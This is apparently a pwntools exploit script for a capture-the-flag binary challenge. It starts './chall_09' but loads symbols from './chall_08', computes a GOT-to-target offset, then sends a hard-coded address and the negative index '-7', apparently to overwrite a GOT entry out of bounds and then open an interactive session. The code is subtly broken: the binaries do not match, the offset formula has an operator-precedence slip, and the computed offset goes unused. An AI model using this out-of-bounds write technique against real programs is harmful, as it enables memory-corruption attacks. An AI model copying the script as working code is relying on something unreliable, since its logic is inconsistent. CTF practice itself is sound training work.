from pwn import *

p = process('./chall_09')
elf = ELF("./chall_08")



offset = elf.sym.target - elf.sym.got['puts'] // 8

print("Offset", offset)


p.sendline("4198950".encode())
p.sendline("-7".encode())


p.interactive()